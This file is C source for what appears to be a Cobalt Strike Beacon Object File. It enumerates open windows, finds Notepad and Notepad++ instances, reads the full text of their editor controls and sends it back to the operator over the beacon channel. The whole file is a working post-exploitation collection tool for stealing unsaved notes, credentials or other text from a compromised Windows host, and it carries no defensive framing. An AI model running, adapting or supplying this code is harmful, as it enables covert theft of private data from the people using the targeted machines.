#include <windows.h>
#include <beacon.h>

#define TARGET_WINDOW_TEXT "Notepad"

#define WM_GETTEXT 0x000d
#define WM_GETTEXTLENGTH 0x000e
#define OUTPUT_BUFFER_SIZE (4 * 1024 * 1024)
#define OUTPUT_FLUSH_THRESHOLD (64 * 1024)

USER32$FindWindowExA: ptr (ptr, ptr, cstr, cstr);
USER32$GetWindowTextA: u32 (ptr, ptr, i32);
USER32$IsWindowVisible: u32 (ptr);
USER32$SendMessageA: size_t (ptr, u32, size_t, size_t);

HWND hwnd;

void flush_output(formatp *out) {
    char *output;
    int output_length;

    output = BeaconFormatToString(out, &output_length);
    if (output != NULL && output_length > 0) {
        BeaconOutput(CALLBACK_OUTPUT, output, output_length);
    }
    BeaconFormatReset(out);
}

void inspect_window(HWND window_handle, formatp *out) {
    char window_name[128];
    DWORD win_len;
    HWND edit_hwnd;
    char *buffer;
    int len;

    window_name[0] = 0;
    win_len = GetWindowTextA(window_handle, window_name, 127);
    if (window_name[0] != 0 && win_len && IsWindowVisible(window_handle)) {
        if (strstr(window_name, TARGET_WINDOW_TEXT)) {
            edit_hwnd = FindWindowExA(window_handle, NULL, "Edit", NULL);
            if (edit_hwnd) {
                len = (int)SendMessageA(edit_hwnd, WM_GETTEXTLENGTH, 0, 0);
                buffer = (char *)calloc(1, len + 1);
                if (buffer != NULL) {
                    SendMessageA(edit_hwnd, WM_GETTEXT, len + 1, (size_t)buffer);
                    BeaconFormatPrintf(out, "[+] Notepad Found: %s\n%s\n", window_name, buffer);
                    free(buffer);
                }
            } else {
                edit_hwnd = FindWindowExA(window_handle, NULL, "Scintilla", NULL);
                if (edit_hwnd) {
                    len = (int)SendMessageA(edit_hwnd, WM_GETTEXTLENGTH, 0, 0);
                    buffer = (char *)calloc(1, len + 1);
                    if (buffer != NULL) {
                        SendMessageA(edit_hwnd, WM_GETTEXT, len + 1, (size_t)buffer);
                        BeaconFormatPrintf(out, "[+] Notepad++ Found: %s\n%s\n", window_name, buffer);
                        free(buffer);
                    }
                }
            }
        }
    }
}

formatp out;

BeaconFormatAlloc(&out, OUTPUT_BUFFER_SIZE);
for (hwnd = FindWindowExA(NULL, NULL, NULL, NULL); hwnd != NULL; hwnd = FindWindowExA(NULL, hwnd, NULL, NULL)) {
    inspect_window(hwnd, &out);
    if (out.length >= OUTPUT_FLUSH_THRESHOLD) {
        flush_output(&out);
    }
}
flush_output(&out);
BeaconFormatFree(&out);
